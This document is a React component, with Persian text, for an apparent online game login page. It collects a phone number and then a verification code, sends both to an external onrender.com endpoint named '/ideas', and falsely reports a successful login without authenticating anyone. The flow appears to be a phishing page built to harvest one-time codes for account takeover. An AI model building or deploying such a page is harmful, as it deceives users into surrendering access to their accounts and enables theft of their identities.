import { useState } from "react";

export default function GameLogin() {
  const [step, setStep] = useState(1);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");

  const onlyNumber = (v) => v.replace(/[^0-9]/g, "");

  const next = () => {
    if (!phone) return alert("شماره را وارد کنید");
    setStep(2);
  };

  const send = async () => {
    if (!code) return alert("کد را وارد کنید");

    await fetch("https://khafan-site.onrender.com/ideas", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phone,
        code,
        text: "login"
      })
    });

    alert("ورود موفق ✅");
    setPhone("");
    setCode("");
    setStep(1);
  };

  return (
    <div className="container">
      <div className="card">

        {step === 1 && (
          <>
            <h2>📱 ورود به بازی آنلاین</h2>

            <input
              placeholder="شماره موبایل"
              value={phone}
              onChange={(e) => setPhone(onlyNumber(e.target.value))}
            />

            <button onClick={next}>ادامه ➡️</button>
          </>
        )}

        {step === 2 && (
          <>
            <h2>🔑 وارد کردن کد</h2>

            <input
              placeholder="کد"
              value={code}
              onChange={(e) => setCode(onlyNumber(e.target.value))}
            />

            <button onClick={send}>ورود 🚀</button>
          </>
        )}

      </div>
    </div>
  );
}